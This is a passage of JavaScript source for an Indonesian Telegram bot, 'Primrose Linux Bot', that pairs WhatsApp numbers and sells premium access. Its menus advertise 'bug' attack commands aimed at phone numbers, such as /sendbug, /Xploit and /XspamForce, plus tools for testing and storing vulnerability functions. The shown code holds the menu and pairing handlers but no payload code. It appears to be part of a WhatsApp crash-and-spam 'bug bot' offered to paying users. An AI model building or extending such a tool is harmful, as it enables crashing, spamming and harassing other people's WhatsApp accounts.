    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (!botNumber || botNumber.length < 10) return safeSendMessage(chatId, "❌ Nomor tidak valid.");
    if (sessions.has(botNumber)) return safeSendMessage(chatId, `✅ Nomor ${botNumber} sudah terhubung.`);
    if (pairingInProgress.has(botNumber)) {
        const elapsed = Date.now() - pairingInProgress.get(botNumber);
        if (elapsed < PAIRING_COOLDOWN) return safeSendMessage(chatId, `⚠️ Pairing sedang berlangsung. Tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik.`);
        pairingInProgress.delete(botNumber);
    }
    await safeSendMessage(chatId, `📱 Memulai pairing untuk ${botNumber}...\n\n⚠️ PENTING:\n1. Pastikan nomor WhatsApp aktif\n2. Masukkan kode pairing yang muncul\n3. Kode berlaku 2 menit`);
    try {
        await ConnectToWhatsApp(botNumber, chatId);
    } catch (error) {
        pairingInProgress.delete(botNumber);
        let errorMsg = "Terjadi kesalahan.";
        if (error.message.includes("timeout")) errorMsg = "⏰ Koneksi timeout.";
        else if (error.message.includes("blocked") || error.message.includes("403")) errorMsg = "🚫 Nomor diblokir.";
        else if (error.message.includes("515")) errorMsg = "🌐 Network Error (515) - IP panel mungkin kena blokir WhatsApp.";
        safeSendMessage(chatId, `❌ GAGAL PAIRING\n\n📱 ${botNumber}\n❗ ${errorMsg}\n\nSilakan coba /reqpair ${botNumber} lagi.`);
    }
});

// ================= POLL & CALLBACK HANDLERS ================= //
bot.on("poll_answer", async (answer) => {
    if (pendingPremiumPoll[answer.poll_id]) {
        const data = pendingPremiumPoll[answer.poll_id];
        if (answer.user.id !== data.adminId) return;
        const choice = answer.option_ids[0];
        let days = choice === 0 ? 7 : choice === 1 ? 14 : choice === 2 ? 30 : "permanent";
        let expiresAt = days === "permanent" ? "permanent" : Date.now() + days * 86400000;
        const existing = premiumUsers.find(u => u.id === data.userId);
        existing ? existing.expiresAt = expiresAt : premiumUsers.push({ id: data.userId, expiresAt });
        savePremiumUsers();
        safeSendMessage(data.chatId, `✅ Premium ditambahkan!\n👤 User: ${data.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
        delete pendingPremiumPoll[answer.poll_id];
    }
    if (pendingColorPoll[answer.poll_id]) {
        const data = pendingColorPoll[answer.poll_id];
        const colors = ["danger", "primary", "success", "secondary", "disco"];
        currentColor = colors[answer.option_ids[0]];
        saveColorSetting();
        if (buttonIntervals.has(data.currentMessageId)) { clearInterval(buttonIntervals.get(data.currentMessageId)); buttonIntervals.delete(data.currentMessageId); }
        if (globalIntervalId) { clearInterval(globalIntervalId); globalIntervalId = null; }
        discoActive = false;
        await sendColoredMenu(data.chatId, data.from, currentColor, data.currentMessageId);
        delete pendingColorPoll[answer.poll_id];
    }
});

bot.on("callback_query", async (query) => {
    if (!query.message) return;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data?.startsWith("autofix_")) {
        const pending = global.pendingFix?.[parseInt(data.replace("autofix_", ""))];
        if (!pending) return bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan." });
        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code..." });
        const fixResult = autoFixJavaScript(pending.code, pending.error);
        const filePath = `fixed_${Date.now()}.js`;
        fs.writeFileSync(filePath, fixResult.fixed);
        await bot.sendDocument(chatId, filePath, { caption: `✅ AUTO FIX BERHASIL!\n\n📊 ${fixResult.fixes.length} Perbaikan:\n${fixResult.fixes.slice(0, 10).map(f => `• ${f}`).join('\n')}` });
        fs.unlinkSync(filePath);
        delete global.pendingFix[parseInt(data.replace("autofix_", ""))];
        return;
    }

    if (buttonIntervals.has(messageId)) { clearInterval(buttonIntervals.get(messageId)); buttonIntervals.delete(messageId); }
    if (globalIntervalId) { clearInterval(globalIntervalId); globalIntervalId = null; }
    discoActive = false;

    let caption = "", replyMarkup = {};

    if (data === "trashmenu") {
        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>\n<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n🗡 Platform : Telegram\n<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>\n─▢ /sendbug +628\n─▢ /Xploit\n─▢ /Sanjiva\n─▢ /Stova\n─▢ /Chatms +628\n─▢ /Ganesha +628\n─▢ /XspamForce +628`;
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
    } else if (data === "owner_menu") {
        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /addprem &lt;id&gt;\n┃ ▢ /delprem &lt;id&gt;\n┃ ▢ /addadmin &lt;id&gt;\n┃ ▢ /deladmin &lt;id&gt;\n┃ ▢ /listprem\n┃ ▢ /listadmin\n┃ ▢ /reqpair ☇ Number\n┃ ▢ /update on/off\n┃ ▢ /autoupdate\n┃ ▢ /checkupdate`;
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
    } else if (data === "group_security_menu") {
        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /blokcmd &lt;command&gt;\n┃ ▢ /bukacmd &lt;command&gt;`;
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
    } else if (data === "toolsbug_menu") {
        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┃ ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;\n┃ ▢ /celahfunc &lt;reply&gt;\n┃ ▢ /addcelah &lt;reply&gt;\n┃ ▢ /listcelah\n┃ ▢ /delcelah &lt;id&gt;\n┃ ▢ /cekfunc &lt;reply&gt;\n┃ ▢ /addparticipant &lt;reply&gt;`;
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] };
    } else if (data === "change_color_menu") {
        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"], { is_anonymous: false });
        pendingColorPoll[poll.poll.id] = { chatId, userId: query.from.id, from: query.from, currentMessageId: messageId };
        return await bot.answerCallbackQuery(query.id);
    } else if (data === "back_to_main") {
        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE";
        const isWhite = currentColor === "secondary";
        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor);
        let keyboard = [
            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
        ];
        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null'));
        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION}\n🗡 Platform : Telegram\n<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>\n⛧ Status : ${status}\n⛧ Number : ${sessions.size}\n⛧ Runtime : ${formatRuntime()}\n⛧ Memory : ${formatMemory()}`;
        await safeEditMessageMedia(chatId, messageId, { type: 'photo', media: getRandomImage(), caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
        if (currentColor === "disco") {
            discoActive = true;
            let index = 0;
            globalIntervalId = setInterval(async () => {
                if (!discoActive) return;
                index = (index + 1) % buttonStyles.length;
                const newStyle = buttonStyles[index];
                let newKeyboard = [
                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
                ];
                await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
            }, 1500);
            buttonIntervals.set(messageId, globalIntervalId);
        }
        return await bot.answerCallbackQuery(query.id);
    }

    if (caption) await safeEditMessageMedia(chatId, messageId, { type: 'photo', media: getRandomImage(), caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
    await bot.answerCallbackQuery(query.id);
});

// ================= ERROR HANDLERS ================= //
process.on('unhandledRejection', (reason) => console.error(chalk.red('Unhandled Rejection:', reason)));
process.on('uncaughtException', (error) => console.error(chalk.red('Uncaught Exception:', error)));

// ================= START EVERYTHING ================= //
setTimeout(async () => {
    const pending = getPendingUpdate();
    if (pending?.chatId) {
        await safeSendMessage(OWNER_ID, `✅ VERSI SUDAH NEW!\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nBot telah berhasil diupdate.`);
        clearPendingUpdate();
    }
}, 3000);

startAutoUpdateChecker();
startBot();
initializeWhatsAppConnections();